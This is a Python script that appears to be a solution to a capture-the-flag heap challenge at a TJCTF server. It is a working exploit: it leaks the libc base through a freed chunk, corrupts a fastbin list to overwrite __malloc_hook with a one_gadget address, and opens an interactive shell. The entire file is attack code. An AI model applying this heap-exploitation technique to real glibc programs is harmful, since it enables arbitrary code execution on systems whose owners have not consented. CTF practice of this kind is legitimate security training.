from ptrlib import *
import ctypes

def create_array(size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", str(size))

def delete_array(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("> ", str(index))

def view_element(index, offset):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("> ", str(index))
    sock.sendlineafter("> ", str(offset))
    return sock.recvline().rstrip()

def edit_element(index, offset, value):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", str(index))
    sock.sendlineafter("> ", str(offset))
    sock.sendlineafter("> ", str(value))

libc = ELF("./libc.so.6")
sock = Socket("p1.tjctf.org", 8001)
#sock = Socket("127.0.0.1", 9999)
main_arena = 0x3c4b20
delta = 0x58
one_gadget = 0xf1147

# libc leak
create_array(0x90 // 8) # 0
create_array(0x60 // 8) # 1
create_array(0x60 // 8) # 2
create_array(0x60 // 8) # 3
delete_array(0)
libc_base = int(view_element(0, 0), 10) - main_arena - delta
logger.info("libc base = " + hex(libc_base))

# overwrite __malloc_hook
delete_array(1)
delete_array(2)
delete_array(3)
# fastbin->3->2->1
edit_element(2, 0x68 // 8, libc_base + libc.symbol("__malloc_hook") - 27 - 8)
# fastbin->3->__malloc_hook-35
create_array(0x60 // 8) # 4
create_array(0x60 // 8) # 5
target = libc_base + one_gadget
edit_element(5, 1, ctypes.c_longlong((target & 0xFFFFFFFFFF) << 24).value)
edit_element(5, 2, target >> 40)

# get the shell!
create_array(0x10 // 8)

sock.interactive()
